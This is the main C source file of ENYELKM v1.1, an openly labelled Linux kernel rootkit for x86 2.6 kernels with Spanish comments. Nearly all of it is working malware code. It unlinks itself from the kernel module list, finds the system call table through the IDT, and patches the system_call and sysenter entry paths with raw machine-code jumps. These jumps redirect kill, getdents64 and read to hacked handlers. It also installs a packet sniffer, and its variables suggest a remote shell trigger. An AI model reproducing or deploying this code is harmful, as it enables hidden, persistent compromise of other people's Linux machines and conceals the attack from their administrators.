/*
 * ENYELKM v1.1
 * Linux Rootkit x86 kernel v2.6.x
 *
 * By RaiSe
 * < raise@enye-sec.org 
 * http://www.enye-sec.org >
 */

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/dirent.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "config.h"
#include "data.h"
#include "remoto.h"
#include "kill.h"
#include "read.h"
#include "ls.h"

#define ORIG_EXIT 19
#define DIRECALL 42
#define SALTO 5
#define SKILL 49
#define SGETDENTS64 57
#define SREAD 65
#define DAFTER_CALL 70
#define DNRSYSCALLS 10


/* punteros a syscalls originales */
asmlinkage int (*orig_kill)(pid_t pid, int sig);
asmlinkage long (*orig_getdents64)
     (unsigned int fd, struct dirent64 *dirp, unsigned int count);


/* variables globales */
unsigned long dire_exit, after_call;
unsigned long dire_call, p_hacked_kill, global_ip;
unsigned long p_hacked_getdents64, p_hacked_read;
short read_activo, lanzar_shell;
void *sysenter_entry;
void **sys_call_table;
struct packet_type my_pkt;
unsigned short global_port;
int errno;


/* prototipos funciones */
void *get_system_call(void);
void *get_sys_call_table(void *system_call);
void set_idt_handler(void *system_call);
void set_sysenter_handler(void *sysenter);


/* estructuras */
struct idt_descriptor
	{
	unsigned short off_low;
	unsigned short sel;
	unsigned char none, flags;
	unsigned short off_high;
	};


/* handler */
char idt_handler[]=
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x3d\x90\x90\x00\x00\x73\x02"
  "\xeb\x06\x68\x90\x90\x90\x90\xc3\x83\xf8\x25\x74\x12\x3d\xdc\x00"
  "\x00\x00\x74\x13\x83\xf8\x03\x74\x16\x68\x90\x90\x90\x90\xc3\xff"
  "\x15\x90\x90\x90\x90\xeb\x0e\xff\x15\x90\x90\x90\x90\xeb\x06\xff"
  "\x15\x90\x90\x90\x90\x68\x90\x90\x90\x90\xc3";



int init_module(void)
{
void *s_call;
struct module *m = &__this_module;

/* borramos nuestro modulo de la lista */
if (m->init == init_module)
	list_del(&m->list);

sysenter_entry = (void *) DSYSENTER;

/* NR_syscalls limite */
*((short int *) &idt_handler[DNRSYSCALLS]) = (short int) NR_syscalls;

/* variables intermedias a las syscalls hackeadas */
p_hacked_kill = (unsigned long) hacked_kill;
p_hacked_getdents64 = (unsigned long) hacked_getdents64;
p_hacked_read = (unsigned long) hacked_read;

/* variables de control */
lanzar_shell = read_activo = 0;
global_ip = 0xffffffff;

/* averiguar sys_call_table */
s_call = get_system_call();
sys_call_table = get_sys_call_table(s_call);

/* punteros a syscalls originales */
orig_kill = sys_call_table[__NR_kill];
orig_getdents64 = sys_call_table[__NR_getdents64];

/* modificar los handlers */
set_idt_handler(s_call);
set_sysenter_handler(sysenter_entry);

/* insertamos el nuevo filtro */
my_pkt.type=htons(ETH_P_ALL);
my_pkt.func=capturar;
dev_add_pack(&my_pkt);

#if DEBUG == 1
printk("enyelkm loaded!\n");
#endif

return(0);

} /*********** fin init_module ***********/



void cleanup_module(void)
{
/* dejar terminar procesos que estan 'leyendo' */
while (read_activo != 0)
    schedule();

#if DEBUG == 1
printk("enyelkm unloaded!\n");
#endif

} /*********** fin cleanup_module ************/



void *get_system_call(void)
{
unsigned char idtr[6];
unsigned long base;
struct idt_descriptor desc;

asm ("sidt %0" : "=m" (idtr));
base = *((unsigned long *) &idtr[2]);
memcpy(&desc, (void *) (base + (0x80*8)), sizeof(desc));

return((void *) ((desc.off_high << 16) + desc.off_low)); 

} /*********** fin get_sys_call_table() ***********/



void *get_sys_call_table(void *system_call)
{
unsigned char *p;
unsigned long s_c_t;

p = (unsigned char *) system_call;

while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
	p++;

dire_call = (unsigned long) p;

p += 3;
s_c_t = *((unsigned long *) p);

p += 4;
after_call = (unsigned long) p;

/* cli */
while (*p != 0xfa)
	p++;

dire_exit = (unsigned long) p;

return((void *) s_c_t);

} /********** fin get_sys_call_table() *************/



void set_idt_handler(void *system_call)
{
unsigned char *p;
unsigned long *p2;

p = (unsigned char *) system_call;

/* primer salto */
while (!((*p == 0x0f) && (*(p+1) == 0x83)))
    p++;

p -= 5;

*p++ = 0x68;
p2 = (unsigned long *) p;
*p2++ = (unsigned long) ((void *) &idt_handler[SALTO]);

p = (unsigned char *) p2;
*p = 0xc3;

/* syscall_trace_entry salto */
while (!((*p == 0x0f) && (*(p+1) == 0x82)))
    p++;

p -= 5;

*p++ = 0x68;
p2 = (unsigned long *) p;
*p2++ = (unsigned long) ((void *) &idt_handler[SALTO]);

p = (unsigned char *) p2;
*p = 0xc3;

p = idt_handler;
*((unsigned long *)((void *) p+ORIG_EXIT)) = dire_exit;
*((unsigned long *)((void *) p+DIRECALL)) = dire_call;
*((unsigned long *)((void *) p+SKILL)) = (unsigned long) &p_hacked_kill;
*((unsigned long *)((void *) p+SGETDENTS64)) = (unsigned long) &p_hacked_getdents64;
*((unsigned long *)((void *) p+SREAD)) = (unsigned long) &p_hacked_read;
*((unsigned long *)((void *) p+DAFTER_CALL)) = after_call;

} /********** fin set_idt_handler() ***********/



void set_sysenter_handler(void *sysenter)
{
unsigned char *p;
unsigned long *p2;

p = (unsigned char *) sysenter;

/* buscamos call */
while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
    p++;

/* buscamos el jae syscall_badsys */
while (!((*p == 0x0f) && (*(p+1) == 0x83)))
    p--;

p -= 5;

/* metemos el salto */

*p++ = 0x68;
p2 = (unsigned long *) p;
*p2++ = (unsigned long) ((void *) &idt_handler[SALTO]);

p = (unsigned char *) p2;
*p = 0xc3;

} /************* fin set_sysenter_handler **********/



/* Licencia GPL */
MODULE_LICENSE("GPL");

/* EOF */
